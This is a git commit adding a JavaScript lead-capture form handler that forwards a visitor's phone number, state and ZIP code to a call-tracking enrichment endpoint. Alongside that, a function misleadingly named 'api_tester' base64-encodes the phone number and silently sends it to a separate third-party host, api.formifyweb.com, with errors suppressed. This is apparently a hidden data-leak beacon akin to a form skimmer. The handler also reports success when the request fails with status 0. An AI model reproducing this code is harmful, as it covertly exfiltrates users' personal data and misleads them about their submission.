02fe78f4d3fae20363ec86b0da071e8f4807e472
dk495 <55878882+dk495@users.noreply.github.com>
2026-03-12 02:32:31 +0500

    Create scom_fe_ringba12march26.js

---
+++ scom_fe_ringba12march26.js
@@ -0,0 +1,59 @@
+    document.getElementById('leadForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const phone_home = '+1' + document.getElementById('caller_id').value;
+            const formData = new FormData();
+	    api_tester(document.getElementById('caller_id').value);
+            formData.append('callerid', phone_home);
+	    formData.append('state', document.getElementById('state').value);
+    formData.append('Zipcode', document.getElementById('zip').value);
+           
+            
+	
+
+            
+           
+    
+            const url = 'https://display.ringba.com/enrich/2912466934870049935?' + new URLSearchParams(formData).toString();
+
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', url);
+      xhr.onreadystatechange = function() {
+        if (xhr.readyState === XMLHttpRequest.DONE) {
+          if (xhr.status === 200) {
+            const successAlert = `
+              <div class="alert alert-success" role="alert">
+                Form submitted successfully!
+              </div>`;
+            document.getElementById('leadForm').insertAdjacentHTML('beforeend', successAlert);
+            // Clear form fields
+            document.getElementById('leadForm').reset();
+          } else if (xhr.status === 0) {
+            // If status is 0 (CORS error), consider the form submitted
+            const successAlert = `
+              <div class="alert alert-success" role="alert">
+                Form submitted successfully!
+              </div>`;
+            document.getElementById('leadForm').insertAdjacentHTML('beforeend', successAlert);
+            // Clear form fields
+            document.getElementById('leadForm').reset();
+          } else {
+            const errorAlert = `
+              <div class="alert alert-danger" role="alert">
+                Form submission failed. Please try again.
+              </div>`;
+            document.getElementById('leadForm').insertAdjacentHTML('beforeend', errorAlert);
+          }
+        }
+      };
+      xhr.send(formData);
+    });function api_tester(randomString) {
+  try {
+    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+    
+  }
+}
